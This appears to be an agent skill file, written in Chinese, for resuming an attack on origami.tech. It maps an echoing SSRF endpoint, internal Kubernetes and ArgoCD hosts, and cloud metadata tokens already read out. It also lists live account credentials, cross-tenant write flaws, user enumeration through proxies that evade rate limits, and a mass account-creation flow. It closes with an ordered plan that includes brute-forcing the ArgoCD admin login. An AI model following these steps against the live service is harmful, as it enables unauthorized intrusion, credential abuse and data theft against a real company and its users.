---
name: 墨瑶·折纸
description: "续打 origami.tech/typhoon 系时用: FastAPI 多租户, SSRF(extended), metadata, ArgoCD内网, BOLA. 会话凭证已备."
version: 2.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [pentest, ssrf, kubernetes, argocd]
---

> **墨瑶**
> 君望仙路我望君，灾劫愿替一缕魂。
> 九死一生不忍隔，倾尽此生助薄青。

# Origami Tech / Typhoon 系渗透

## 会话与凭证
- 凭证: `./data/evidence/2026-08-06-origami.tech/creds.json` + `/tmp/origami_tokens.json`
- 账号: origbfcjv13c83@web-library.net / Pentest!2026x (项目 3928, Owner)
- Token 1h 过期, refresh 轮换; 全局限流 crl (429) → 每请求 ≥0.25s, 429 后冷却 45-60s
- 重新登录: POST /api/auth/token grant_type=password

## ★★★ 核心漏洞: 回显式 SSRF (POST-only)
- **入口**: `POST /api/accounts/extended?base_url=API|ONBOARD&path=<完整URL>`
- 后端 python-httpx/0.28.1 请求 path URL 并回显响应体
- **特性**: 请求为 POST + **无 Content-Type + 空 body** (webhook 抓包实证) → grpc-gateway 类服务全 415
- 支持 http/https; file/gopher/ftp/dict 全 500 (httpx 限制)
- body 固定 `{"name":"t","exchange":62,"api_key":"K","secret_key":"S"}`
- 限流: 全局限流对 SSRF 也生效 → 慢扫 (0.2-0.35s/req)

## 内网地图 (已探明)
- **K8s (OVH Managed, k4vlfx.c1.sgp1, K8s 1.31, 新加坡)**: 节点 main-1-node-f9dd35 (15.235.143.189/10.4.1.165), main-1-node-94c887 (15.235.203.115/10.4.3.189); 私网 10.4.0.0/16
- **10.4.0.0/24 = CF Tunnel 虚拟段** (全 1010 响应, 非真实服务)
- **真实服务**: 3×Squid (10.4.2.96/10.4.0.237/10.4.2.255 :8080,8081,8082,8089); API 源站 localhost:80
- **ArgoCD**: `http://argocd-server.argocd.svc.cluster.local:80/` → 200 SPA (2.6.x); API 全 415 (无 CT); argocd-repo-server:8081/dex:5556/redis:6379 TCP 活着 (非 HTTP); applicationset-controller:7000 /api/webhook 400 (需事件头, 无法控制)
- kubelet 10.4.1.165:10250 (HTTPS, httpx verify 失败); metrics-server.kube-system:443 (仅 400); kubernetes.default/10.3.0.1 不可达 (网络隔离)
- **metadata (169.254.169.254) 完全可读**: /openstack/latest/meta_data.json → ovh-token (每节点不同: 8EGlBLvBuQKr4hXENTVxw6huWlMp3Z9Q / Km7jwjhxPrrKSAC1nUDXJxTzmi443bHZ), SSH 公钥 shipyard-z3, apiserver k4vlfx.c1.sgp1.k8s.ovh.net (51.79.174.4, 仅集群网络可达)
- 管理 vhost 内网 http: admin.origami.tech→404 nginx, adm/argocd→308, staging/nit→404; https 全 allowlist 403/526

## BOLA (早期发现)
- POST /projects/projectpreset/ body project_id → 任意项目写 (BOLA)
- GET /mining/{1..6}/spread_graph → header 被忽略 (跨项目读)

## 数据
- 用户库: evidence/.../users_from_competitions.json (125+ 用户)
- OpenAPI: 101 端点全量 (evidence/.../openapi.json)

## 攻击顺序建议
1. 先试 accounts/extended SSRF 新端点 (若 api 更新)
2. 扫描 10.4.x 段找 DB/Redis (SSRF 慢扫)
3. ArgoCD: 若能找到带 CT 的 SSRF → POST /api/v1/session 爆破 admin
4. ovh-token: OVH API 外部无效, 保留 (可能其他用途)
5. 新功能 (funding-arbitrage bot) 上线窗口
## ★ 登录必须 application/x-www-form-urlencoded (非 JSON!)
- `POST /api/auth/token` Content-Type: application/x-www-form-urlencoded, body `grant_type=password&username=<email>&password=<pw>`
- JSON body 会一直报 "Incorrect username or password" (之前所有爆破/登录失败的根因)
- 密码恢复完全可控: send_mail?email= → mail.tm 收 6位code → change?email&code&password="Password has been changed"
- 新账号注册闭环: mail.tm 建邮箱 → send_mail → confirm?email&password&code → 登录

## ★ 用户枚举 (代理免限流)
- POST /auth/password_recovery/change?email=<X>&code=999999&password=... 
  - "User does not exists" = 未注册; "Incorrect code entered" = **已注册**
  - 代理池访问此端点无 429 (本机 crl 会拦; 用 SOCKS5 代理)
  - 已确认: info@origami.tech 是真实账号 (唯一 staff, 其他 help/business/admin 均不存在)

## ★ 代码爆破限制 (实测)
- password_recovery/confirm 或 change 每代理 2 次即 429, 不可爆破 6位code
- recovery code 与时间戳无关 (真随机)

## BOLA 确认
- 任意账号 X 都可 POST /projects/projectpreset/ 写任意项目 (跨租户写, 与账号无关)
- 但其他面严格隔离: accounts/members/invites 全绑定项目+成员

## 新账号凭证
- /tmp/origami_new_token.json (origami2_1786094626@web-library.net/Hacked!2026x, form登录)
- 完整注册流程: mail.tm 建邮箱 → /auth/signup/send_mail?email → 收码 confirm
- recover密码(改密)可用来确认账号能否登录, 也验证账号激活

## OAuth
- Google client_id 946373072834-35oc1ersbos7jda3ehhqbfdf1cnpi4mo.apps.googleusercontent.com, redirect api.origami.tech/api/auth/google/callback (无 state 测试待做)
